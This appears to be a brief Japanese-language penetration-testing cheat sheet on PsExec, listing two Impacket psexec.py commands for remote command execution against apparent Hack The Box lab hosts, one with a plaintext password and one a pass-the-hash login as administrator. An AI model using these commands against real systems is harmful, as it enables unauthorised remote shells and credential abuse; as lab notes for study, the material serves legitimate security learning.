# PsExec
リモートでコマンド実行

# Usage

```
psexec.py pentest:'P3nT3st!'@10.10.10.152

psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb/administrator@10.10.10.161 powershell.exe
```
